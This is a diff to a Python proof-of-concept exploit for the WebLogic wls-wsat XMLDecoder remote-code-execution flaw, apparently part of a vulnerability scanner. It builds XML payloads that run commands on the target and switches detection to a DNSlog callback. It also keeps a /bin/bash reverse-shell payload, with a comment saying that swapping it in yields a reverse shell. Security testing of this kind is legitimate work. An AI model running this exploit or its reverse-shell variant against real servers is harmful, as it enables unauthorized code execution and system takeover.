@@ -19,17 +19,19 @@ Referer
 """
 import requests
 import logging
+from plugin.dnslog import Dnslog
 
 def poc(url):
     url = url if '://' in url else 'http://' + url
     url = url.split('#')[0].split('?')[0].rstrip('/')
 
-    exec_cmd = "touch /tmp/success"
-    exec_data = '<array class="java.lang.String" length="{0}">'.format(len(exec_cmd.split()))
-    for i, c in enumerate(exec_cmd.split()):
-        exec_data += '<void index="{0}"><string>{1}</string></void>'.format(i, c)
-    exec_data += '</array>'
-    reverse_shell_data = '''
+    mydnslog = Dnslog("weblogic-wls-xml")
+    cmd = mydnslog.getCommand("dns")
+    exec_cmd = '<array class="java.lang.String" length="{0}">'.format(len(cmd.split()))
+    for i, c in enumerate(cmd.split()):
+        exec_cmd += '<void index="{0}"><string>{1}</string></void>'.format(i, c)
+    exec_cmd += '</array>'
+    reverse_shell_cmd = '''
     <array class="java.lang.String" length="3">
         <void index="0">
         <string>/bin/bash</string>
@@ -60,8 +62,10 @@ def poc(url):
     vulurl = url + "/wls-wsat/CoordinatorPortType"
     try:
         headers = {'Content-Type': 'text/xml;charset=UTF-8'}
-        data = payload_data.format(reverse_shell_data) # 替换成reverse_shell_data就是反弹shell
+        data = payload_data.format(exec_cmd) # 替换成reverse_shell_data就是反弹shell
         resp = requests.post(vulurl, data=data, headers=headers, timeout=10)
+        if mydnslog.verifyDNS(3):
+            return "[weblogc-wls-xmldecoder][dnslog]" + url
         if '<faultstring>java.lang.ProcessBuilder' in resp.text or "<faultstring>0" in resp.text:
             return True
     except Exception as e:
@@ -70,4 +74,4 @@ def poc(url):
 
 if __name__ == "__main__":
     logging.basicConfig(level=logging.DEBUG)
-    poc("192.168.1.139:7001")
+    print poc("192.168.1.139:7001")
